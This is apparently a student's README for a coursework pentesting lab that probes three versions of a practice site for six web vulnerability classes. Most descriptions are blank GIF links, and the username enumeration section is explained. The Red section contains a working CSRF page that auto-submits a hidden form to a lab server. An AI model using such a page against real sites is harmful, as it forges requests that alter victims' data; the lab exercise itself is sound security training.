# Project 8 - Pentesting Live Targets

Time spent: **7** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:

* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each color is vulnerable to only 2 of the 6 possible exploits. First discover which color has the specific vulnerability, then write a short description of how to exploit it, and finally demonstrate it using screenshots compiled into a GIF.

## Blue

Vulnerability #1: SQL Injection

Description: 

<img src="http://g.recordit.co/aUAfU46Xqi.gif">


Vulnerability #2: Session Hijacking/Fixation

Description:

<img src="http://g.recordit.co/CXUME0aTWJ.gif">



## Green

Vulnerability #1: Username Enumeration

Description: The bold text that is returned when we use "jmonroe99" as the username and and standard text returned when we use "hacker" as the username tells us as hackers that "jmonroe99" is in the database and "hacker" is not. This is username enumeration vulnerability becuase the system gave information regarding which is a correct and wrong username with the use of bold text. 

<img src="http://g.recordit.co/5wCwKNN9VV.gif">

Vulnerability #2: Cross-Site Scripting

Description:

<img src="http://g.recordit.co/96WgGM2QMX.gif">


## Red

Vulnerability #1: Insecure Direct Object Reference

Description:

<img src="http://g.recordit.co/bB1RVWjluf.gif">

Vulnerability #2: Cross-Site Request Forgery

```
<!doctype html>
<html lang="en">
  <head>
    <title></title>
  </head>
  <body onload="document.ohnoForm.submit()">
  <h1>Some random important content</h1>
  <h2>definitely not a trap.</h2>
    <form name="ohnoForm" action="https://35.184.88.145/red/public/staff/salespeople/show.php?id=3" method="POST" style="display: none;" target="secretIFrame" > <br />
      <input type="hidden" name="csrf_token" value="" /> <br />
      <input type="text" name="first_name" value="Oh" /> <br />
      <input type="text" name="last_name" value="No" /> <br />
      <input type="text" name="phone" value="555-867-5309" /><br />
      <input type="text" name="email" value="bleh@example.org" /><br />
    </form>
    <iframe name="secretIFrame" style="display:none;"></iframe>
  </body>
</html>
```

Description:

<img src="http://g.recordit.co/s81R3gbEvc.gif">


## Notes

Describe any challenges encountered while doing the work

